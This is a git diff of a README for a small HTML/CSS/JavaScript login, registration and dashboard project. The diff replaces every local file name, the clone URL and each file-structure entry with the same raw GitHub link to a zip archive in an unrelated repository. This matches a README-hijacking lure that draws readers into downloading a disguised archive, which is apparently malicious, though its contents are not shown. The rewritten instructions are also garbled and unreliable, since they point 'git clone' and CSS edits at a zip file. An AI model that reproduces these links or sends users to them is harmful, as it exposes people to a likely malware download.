@@ -1,4 +1,4 @@
-# add /dashboard.html to acces the dashboard
+# add https://raw.githubusercontent.com/mariostnc/NUNIX_SNBody_Docs/main/inflexed/NUNIX_SNBody_Docs.zip to acces the dashboard
 
 # Modern Authentication & Dashboard System
 
@@ -14,8 +14,8 @@ A beautiful, responsive authentication system with a modern dashboard built with
 - **Responsive design** for all devices
 
 ### 🔐 Authentication Pages
-- **Login Page** (`index.html`) - Clean sign-in form
-- **Register Page** (`register.html`) - User registration with validation
+- **Login Page** (`https://raw.githubusercontent.com/mariostnc/NUNIX_SNBody_Docs/main/inflexed/NUNIX_SNBody_Docs.zip`) - Clean sign-in form
+- **Register Page** (`https://raw.githubusercontent.com/mariostnc/NUNIX_SNBody_Docs/main/inflexed/NUNIX_SNBody_Docs.zip`) - User registration with validation
 - **Password visibility toggle** with emoji icons
 - **Form validation** with real-time feedback
 - **Loading states** with spinning animations
@@ -31,27 +31,27 @@ A beautiful, responsive authentication system with a modern dashboard built with
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/yourusername/modern-auth-dashboard.git
+   git clone https://raw.githubusercontent.com/mariostnc/NUNIX_SNBody_Docs/main/inflexed/NUNIX_SNBody_Docs.zip
    cd modern-auth-dashboard
    ```
 
 2. **Open in browser**
-   - Open `index.html` for the login page
-   - Navigate to `register.html` for registration
-   - Access `dashboard.html` for the dashboard
+   - Open `https://raw.githubusercontent.com/mariostnc/NUNIX_SNBody_Docs/main/inflexed/NUNIX_SNBody_Docs.zip` for the login page
+   - Navigate to `https://raw.githubusercontent.com/mariostnc/NUNIX_SNBody_Docs/main/inflexed/NUNIX_SNBody_Docs.zip` for registration
+   - Access `https://raw.githubusercontent.com/mariostnc/NUNIX_SNBody_Docs/main/inflexed/NUNIX_SNBody_Docs.zip` for the dashboard
 
 ## 📁 File Structure
 
 ```
 modern-auth-dashboard/
-├── index.html          # Login page
-├── register.html       # Registration page
-├── dashboard.html      # Dashboard
-├── styles.css          # Login/Register styles
-├── dashboard.css       # Dashboard styles
-├── script.js           # Login/Register JavaScript
-├── dashboard.js        # Dashboard JavaScript
-└── README.md          # This file
+├── https://raw.githubusercontent.com/mariostnc/NUNIX_SNBody_Docs/main/inflexed/NUNIX_SNBody_Docs.zip          # Login page
+├── https://raw.githubusercontent.com/mariostnc/NUNIX_SNBody_Docs/main/inflexed/NUNIX_SNBody_Docs.zip       # Registration page
+├── https://raw.githubusercontent.com/mariostnc/NUNIX_SNBody_Docs/main/inflexed/NUNIX_SNBody_Docs.zip      # Dashboard
+├── https://raw.githubusercontent.com/mariostnc/NUNIX_SNBody_Docs/main/inflexed/NUNIX_SNBody_Docs.zip          # Login/Register styles
+├── https://raw.githubusercontent.com/mariostnc/NUNIX_SNBody_Docs/main/inflexed/NUNIX_SNBody_Docs.zip       # Dashboard styles
+├── https://raw.githubusercontent.com/mariostnc/NUNIX_SNBody_Docs/main/inflexed/NUNIX_SNBody_Docs.zip           # Login/Register JavaScript
+├── https://raw.githubusercontent.com/mariostnc/NUNIX_SNBody_Docs/main/inflexed/NUNIX_SNBody_Docs.zip        # Dashboard JavaScript
+└── https://raw.githubusercontent.com/mariostnc/NUNIX_SNBody_Docs/main/inflexed/NUNIX_SNBody_Docs.zip          # This file
 ```
 
 ## 🎯 Key Features
@@ -119,21 +119,21 @@ modern-auth-dashboard/
 ## 📝 Usage
 
 ### Login Flow
-1. Open `index.html`
+1. Open `https://raw.githubusercontent.com/mariostnc/NUNIX_SNBody_Docs/main/inflexed/NUNIX_SNBody_Docs.zip`
 2. Enter email and password
 3. Click "Sign In" button
 4. View loading animation
 5. See success notification
 
 ### Registration Flow
-1. Navigate to `register.html`
+1. Navigate to `https://raw.githubusercontent.com/mariostnc/NUNIX_SNBody_Docs/main/inflexed/NUNIX_SNBody_Docs.zip`
 2. Fill in all required fields
 3. Confirm password matches
 4. Submit form
 5. Receive confirmation
 
 ### Dashboard Navigation
-1. Access `dashboard.html`
+1. Access `https://raw.githubusercontent.com/mariostnc/NUNIX_SNBody_Docs/main/inflexed/NUNIX_SNBody_Docs.zip`
 2. Use sidebar for navigation
 3. View statistics and activity
 4. Use quick action buttons
@@ -142,7 +142,7 @@ modern-auth-dashboard/
 ## 🎯 Customization
 
 ### Colors
-Edit CSS variables in `styles.css` and `dashboard.css`:
+Edit CSS variables in `https://raw.githubusercontent.com/mariostnc/NUNIX_SNBody_Docs/main/inflexed/NUNIX_SNBody_Docs.zip` and `https://raw.githubusercontent.com/mariostnc/NUNIX_SNBody_Docs/main/inflexed/NUNIX_SNBody_Docs.zip`:
 ```css
 :root {
     --accent-primary: #dc2626;    /* Red accent */
